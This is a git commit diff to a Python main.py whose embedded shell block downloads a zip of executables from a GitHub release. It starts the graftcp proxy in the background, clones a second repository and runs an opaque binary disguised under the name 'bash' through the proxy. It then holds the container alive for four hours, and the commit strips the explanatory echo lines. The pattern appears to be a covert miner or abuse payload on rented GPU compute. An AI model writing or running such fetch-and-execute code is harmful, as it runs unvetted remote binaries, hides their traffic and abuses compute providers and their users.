24d8d0c71314d2f2009fffa993547fe5b9df9fe6
firdanamahardana356 <firdanamahardana356@jukilana.kulkasmurah.live>
2026-05-31 14:10:46 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,5 @@
 import subprocess
 import time
-import os
 
 def run():
     print("=== CHECK GPU ===")
@@ -9,43 +8,34 @@ def run():
     cmd = """
     set -e
 
-    echo "=== UPDATE & INSTALL ==="
     apt update -y
     apt install -y wget unzip git
 
-    echo "=== DOWNLOAD FILE ==="
     wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip
-
-    echo "=== EXTRACT ==="
     unzip -o pan.zip
 
     cd pan
-
-    echo "=== SET PERMISSION ==="
     chmod -R +x .
 
-    echo "=== START GRAFTCP LOCAL ==="
     ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &
 
     sleep 3
 
-    echo "=== CLONE REPO ==="
     git clone https://github.com/hujisanda/lol198.git
     cd lol198 && chmod u+x bash
 
-    echo "=== MOVE FILE ==="
     mv bash ~/pan
 
-    cd ~
-    cd pan
-
-    echo "=== RUN SCRIPT ==="
+    cd ~/pan
     ./graftcp/graftcp ./bash
     """
 
-    subprocess.run(["bash", "-lc", cmd], check=False)
+    try:
+        subprocess.run(["bash", "-lc", cmd], check=True)
+    except subprocess.CalledProcessError as e:
+        print("ERROR:", e)
 
-    print("=== KEEP CONTAINER ALIVE (4 JAM) ===")
+    print("=== KEEP ALIVE 4 JAM ===")
     time.sleep(60 * 60 * 4)
 
     return {"status": "done"}
